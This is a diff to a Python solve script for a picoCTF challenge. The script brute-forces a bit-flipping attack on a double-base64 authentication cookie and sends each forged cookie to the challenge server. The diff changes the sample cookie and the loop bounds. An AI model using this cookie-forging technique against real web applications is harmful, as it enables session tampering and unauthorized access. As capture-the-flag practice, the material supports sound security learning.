@@ -14,11 +14,11 @@ def bit_flip(pos, bit, data):
     raw = bytes(list1)
     return b64encode(b64encode(raw)).decode()
 
-cookie = "S3V3TzB0TytIRnhMT08wODIvdUFxS2dDRWR4WGNlNTNjSVpCVjIyMU01Zk5ZczNiRXhVWTV2eXlZaWpEYzVZWDBZOHdIK2hGMUNrNXlEVXhjby9HMTFPeU40aU50dFp5NEhLdU9pR3hMM3ZEOFlrck9IUVQxSVArTVJqR3V1TzA="
+cookie = "bGhscUt0MDhuTzYyVUE1c0dUV3h1bEtpazVRWCtOWEY5bVVGN1VjcTMxakEvRS82NXFFbzRveHVEaFFLTU5sSENzRmlWNWx3b25NYVFkSHFTN0E5T3ZCSUR1YzA1UE55dytXaFBWZmQ5RE1DSzNmVTdTZGtYdGFraHQveUw3Y1A="
 
-for position_idx in tqdm(range(len(cookie)), desc="Bruteforcing Position"):
+for position_idx in tqdm(range(50), desc="Bruteforcing Position"):
     # The 96 really should be 128 to test every bit, but 96 worked for me.
-    for bit_idx in tqdm(range(len(cookie)), desc="Bruteforcing Bit"):
+    for bit_idx in tqdm(range(50), desc="Bruteforcing Bit"):
         auth_cookie = bit_flip(position_idx, bit_idx, cookie)
         cookies = {'auth_name': auth_cookie}
         r = requests.get('http://mercury.picoctf.net:21553/', cookies=cookies)
